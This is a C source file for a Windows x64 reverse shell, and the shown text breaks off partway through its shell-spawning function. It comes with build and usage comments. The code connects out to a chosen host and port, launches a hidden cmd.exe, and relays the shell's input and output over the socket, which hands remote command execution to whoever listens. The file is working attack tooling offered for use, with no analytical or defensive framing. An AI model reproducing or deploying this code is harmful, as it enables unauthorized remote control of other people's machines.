```c
// revshell.c — Windows x64 reverse shell
// Build:
//   MSVC:  cl /nologo /O2 revshell.c ws2_32.lib
//   MinGW: x86_64-w64-mingw32-gcc -O2 -o revshell.exe revshell.c -lws2_32
//
// Usage:
//   revshell.exe [host] [port]
//   defaults: 127.0.0.1:4444

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_HOST       "127.0.0.1"
#define DEFAULT_PORT       4444
#define INITIAL_BACKOFF_MS 1000
#define MAX_BACKOFF_MS     60000

typedef struct {
    HANDLE hPipe;   // pipe end owned by this relay
    SOCKET sock;    // shared TCP socket
} RELAY_CTX;

static DWORD WINAPI PipeToSocket(LPVOID param) {
    RELAY_CTX* ctx = (RELAY_CTX*)param;
    char buf[4096];
    DWORD nRead;

    for (;;) {
        if (!ReadFile(ctx->hPipe, buf, sizeof(buf), &nRead, NULL) || nRead == 0)
            break;
        if (send(ctx->sock, buf, (int)nRead, 0) == SOCKET_ERROR)
            break;
    }
    return 0;
}

static DWORD WINAPI SocketToPipe(LPVOID param) {
    RELAY_CTX* ctx = (RELAY_CTX*)param;
    char buf[4096];
    int nRecv;

    for (;;) {
        nRecv = recv(ctx->sock, buf, sizeof(buf), 0);
        if (nRecv <= 0)
            break;
        DWORD written;
        if (!WriteFile(ctx->hPipe, buf, (DWORD)nRecv, &written, NULL))
            break;
    }
    return 0;
}

static BOOL SpawnShell(SOCKET sock) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hInR  = NULL, hInW  = NULL;
    HANDLE hOutR = NULL, hOutW = NULL;
    HANDLE hErrR = NULL, hErrW = NULL;

    if (!CreatePipe(&hInR,  &hInW,  &sa, 0)) goto fail;
    if (!CreatePipe(&hOutR, &hOutW, &sa, 0)) goto fail;
    if (!CreatePipe(&hErrR, &hErrW, &sa, 0)) goto fail;

    // Parent-side ends must not be inherited by the child.
    SetHandleInformation(hInW,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hErrR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { 0 };
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdInput   = hInR;
    si.hStdOutput  = hOutW;
    si.hStdError   = hErrW;

    PROCESS_INFORMATION pi = { 0 };
    char cmd[] = "cmd.exe /Q";

    BOOL ok = CreateProcessA(
        NULL, cmd, NULL, NULL, TRUE,
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
        NULL, NULL, &si, &pi);
    DWORD createErr = GetLastError();

    // Child owns these now.
    CloseHandle(hInR);
    CloseHandle(hOutW);
    CloseHandle(hErrW);

    if (!ok) {
        SetLastError(createErr);
        goto fail;
    }

    RELAY_CTX* cxOut = (RELAY_CTX*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RELAY_CTX));
    RELAY_CTX* cxErr = (RELAY_CTX*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RELAY_CTX));
    RELAY_CTX* cxIn  = (RELAY_CTX*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RELAY_CTX));
    if (!cxOut || !cxErr || !cxIn) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, cxOut);
        HeapFree(GetProcessHeap(), 0, cxErr);
        HeapFree(GetProcessHeap(), 0, cxIn);
        goto fail;
    }

    cxOut->hPipe = hOutR; cxOut->sock = sock;
    cxErr->hPipe = hErrR; cxErr->sock = sock;
    cxIn->hPipe  = hInW;  cxIn->sock  = sock;

    HANDLE thOut = CreateThread(NULL, 0, PipeToSocket, cxOut, 0, NULL);
    HANDLE thErr = CreateThread(NULL, 0, PipeToSocket, cxErr, 0, NULL);
    HANDLE thIn  = CreateThread(NULL, 0, SocketToPipe, cxIn,  0, NULL);

    // Session ends on either: child process exit, or socket-side termination.
    HANDLE waits[2] = { pi.hProcess, thIn };
    WaitForMultipleObjects(2, waits, FALSE, INFINITE);

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);

